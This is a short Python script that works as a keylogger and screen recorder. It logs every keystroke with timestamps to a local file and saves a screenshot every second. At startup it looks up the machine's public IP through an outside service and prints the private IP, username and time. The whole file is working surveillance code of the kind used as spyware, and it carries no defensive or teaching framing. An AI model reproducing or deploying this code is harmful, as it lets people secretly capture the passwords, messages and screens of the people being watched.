import pynput
import time
import os
import random
import requests
import socket


from threading import Timer, Thread
from pynput.keyboard import Key, Listener
from mss import mss


publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname('localhost')
user = os.path.expanduser('~').split('\\')[0]
datetime = time.ctime(time.time())

print(publicIP)
print(privateIP)
print(user)
print(datetime)



class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

class Monitor:

    def on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))

    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    def _screenshot(self):
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))

    def _keylogger(self):

        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def run(self, interval=1):
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()


if __name__ == '__main__':
    mon = Monitor()
    mon.run()
